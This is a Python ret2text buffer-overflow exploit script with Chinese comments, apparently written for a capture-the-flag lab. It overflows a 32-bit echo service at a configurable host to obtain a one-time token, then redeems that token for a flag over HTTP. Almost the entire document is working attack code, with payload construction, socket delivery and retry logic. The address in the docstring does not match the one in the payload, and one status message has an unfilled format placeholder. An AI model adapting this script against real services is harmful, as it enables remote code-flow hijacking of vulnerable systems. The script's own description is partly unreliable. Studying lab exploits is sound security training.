#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ret2text exploit —— 32 位 PE echo 服务，一条龙拿 flag
============================================================
溢出 -> 跳 0x00416130 领一次性 token -> 自动访问 flag 靶机兑换 flag

用法:  python a1.py          （直接跑，配置改下面两行）
       python a1.py -i       （运行时提示输入 token 靶机和 flag 靶机）
"""
import re
import socket
import struct
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

# ============================================================
# 两个靶机地址（改成你自己的）
TOKEN_HOST, TOKEN_PORT = "172.17.43.31", 9999
FLAG_HOST,  FLAG_PORT  = "172.17.0.13",   11922

OFFSET = 132 
# ============================================================

TOKEN_RE = re.compile(rb"([0-9]{9,12}\.[A-Za-z0-9_\-]{20,})")
FLAG_RE = re.compile(r"[A-Za-z][A-Za-z0-9_]{1,15}\{[^}\r\n]{1,256}\}")   # 靶场是 vmc{...}
TOKEN_TTL = 600          # token 有效期 10 分钟


def p32(x):
    return struct.pack("<I", x & 0xFFFFFFFF)


def recv_all(s, timeout):
    s.settimeout(timeout)
    out = b""
    while True:
        try:
            d = s.recv(4096)
            if not d:
                break
            out += d
        except socket.timeout:
            break
        except OSError:
            break
    return out


def get_token(verbose=True):
    """溢出打靶，返回一次性 token"""
    _data=b"A" * 512
    pl = b"A" * OFFSET + p32(0x00401000)
    if verbose:
        print("[*] payload = %s" % pl.hex())

    s = socket.create_connection((TOKEN_HOST, TOKEN_PORT), timeout=8)
    banner = recv_all(s, 2.0)
    if verbose:
        print("[<] banner  = %r" % banner)
        
    s.sendall(_data)
    time.sleep(0.4)
    resp1= recv_all(s, 5.0)
    if verbose:
        print("[>] _data   = %r" % (_data))
        print("[<] resp1   = %r" % resp1)
    
    s.sendall(pl)
    time.sleep(0.4)
    data = recv_all(s, 5.0)
    try:
        s.close()
    except OSError:
        pass
    if verbose:
        print("[<] 响应    = %r" % data)

    m = TOKEN_RE.search(data)
    return m.group(1).decode() if m else None


def http_get(url, timeout=6.0):
    """GET 一个 URL，返回 (状态码, 响应体)"""
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    req = urllib.request.Request(url, headers={"User-Agent": "curl/8.5.0"})
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def try_flag(token):
    """访问 flag 靶机兑换：curl "http://<Flag靶机IP>:<port>/flag?token=<凭证>"
    返回 (flag, 说明)。说明里 future=True 表示只是时钟问题，等一下还能用。"""
    url = "http://%s:%d/flag?%s" % (FLAG_HOST, FLAG_PORT,
                                    urllib.parse.urlencode({"token": token}))
    try:
        status, body = http_get(url)
    except (urllib.error.URLError, OSError, ValueError) as e:
        return None, {"err": "连不上 flag 靶机: %s" % e, "future": False}
    body = body.strip()
    print("[<] HTTP %s  %s" % (status, url))
    print("    body = %r" % body)

    m = FLAG_RE.search(body)
    if m:
        return m.group(0), {"status": status}
    if "future" in body.lower():
        return None, {"err": body, "future": True}
    return None, {"err": "HTTP %s: %s" % (status, body), "future": False}


def clock_gap():
    """用 flag 靶机的 Date 头量本地时钟比它快多少秒"""
    try:
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
        req = urllib.request.Request("http://%s:%d/" % (FLAG_HOST, FLAG_PORT),
                                     headers={"User-Agent": "curl/8.5.0"})
        with opener.open(req, timeout=6) as r:
            date = r.headers.get("Date")
    except urllib.error.HTTPError as e:
        date = e.headers.get("Date") if e.headers else None
    except (urllib.error.URLError, OSError, ValueError):
        return 0
    if not date:
        return 0
    from email.utils import parsedate_to_datetime
    gap = int(time.time() - parsedate_to_datetime(date).timestamp())
    print("[*] flag 靶机时间 = %s   ->  本地快 %d 秒" % (date, gap))
    return gap


def get_flag():
    """一条龙：拿 token -> 换 flag，必要时等时钟追上来"""
    print("[*] STEP 1  溢出 -> 0x%08X 领 token")
    token = get_token()
    if not token:
        print("[-] 没抓到 token，检查 TOKEN_HOST / OFFSET / TARGET。")
        return None
    print("[+] TOKEN = %s" % token)

    print()
    print("[*] STEP 2  用 token 换 flag")
    flag, info = try_flag(token)
    if flag:
        return flag

    # 凭证是靶机时钟签的，flag 靶机时钟慢就会报 "token from the future"
    if info.get("future"):
        wait = max(clock_gap(), 0) + 20
        if wait > TOKEN_TTL:
            print("[-] 时钟差 %d 秒，超过 token 10 分钟有效期，等不了。" % wait)
            return None
        print("[*] 只是时钟差，凭证还有效 —— 等 %d 秒让 flag 靶机时钟追上来..." % wait)
        left = wait
        while left > 0:
            time.sleep(min(10, left))
            left -= 10
            if left > 0:
                print("    ... 还需 %d 秒" % left)
        flag, info = try_flag(token)
        if flag:
            return flag

    print("[-] 兑换失败：%s" % info.get("err"))
    print('    可手动重试: curl "http://%s:%d/flag?token=%s"'
          % (FLAG_HOST, FLAG_PORT, token))
    return None


def main():
    global TOKEN_HOST, TOKEN_PORT, FLAG_HOST, FLAG_PORT

    if "-i" in sys.argv:
        a = input("token 靶机 (ip[:port]) [%s:%d]: " % (TOKEN_HOST, TOKEN_PORT)).strip()
        if a:
            TOKEN_HOST, _, p = a.partition(":")
            TOKEN_PORT = int(p) if p else TOKEN_PORT
        b = input("flag  靶机 (ip[:port]) [%s:%d]: " % (FLAG_HOST, FLAG_PORT)).strip()
        if b:
            FLAG_HOST, _, p = b.partition(":")
            FLAG_PORT = int(p) if p else FLAG_PORT

    print("=" * 60)
    print("  token 靶机 = %s:%d" % (TOKEN_HOST, TOKEN_PORT))
    print("  flag  靶机 = %s:%d" % (FLAG_HOST, FLAG_PORT))
    print("=" * 60)

    flag = get_flag()
    print()
    if flag:
        print("[+] FLAG = %s" % flag)
        return 0
    print("[-] 没拿到 flag")
    return 1


if __name__ == "__main__":
    sys.exit(main())
